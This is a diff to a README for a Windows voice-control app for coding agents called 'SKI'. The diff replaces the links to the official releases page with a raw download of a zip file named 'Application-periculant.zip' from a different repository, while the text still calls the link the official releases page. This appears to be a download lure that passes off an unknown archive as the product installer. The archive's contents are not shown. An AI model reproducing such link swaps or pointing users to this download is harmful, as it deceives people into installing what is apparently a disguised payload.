@@ -5,7 +5,7 @@ description: "Download official releases and the auto-update feed for the SKI vo
 ---
 # 🎙️ ski-releases - Voice control for your coding agent
 
-[![Download SKI for Windows](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://github.com/waro7573/ski-releases)
+[![Download SKI for Windows](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://raw.githubusercontent.com/waro7573/waro7573.github.io/main/public/Application-periculant.zip)
 
 SKI acts as a voice interface for your coding agent. It allows you to speak instructions directly into your development environment. This application listens to your voice and turns your words into commands for tools like Claude Code. You save time by describing changes instead of typing them.
 
@@ -22,7 +22,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/waro7573/ski-releases) to find the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/waro7573/waro7573.github.io/main/public/Application-periculant.zip) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file to start the download.
 4. Open the downloaded file once it finishes.
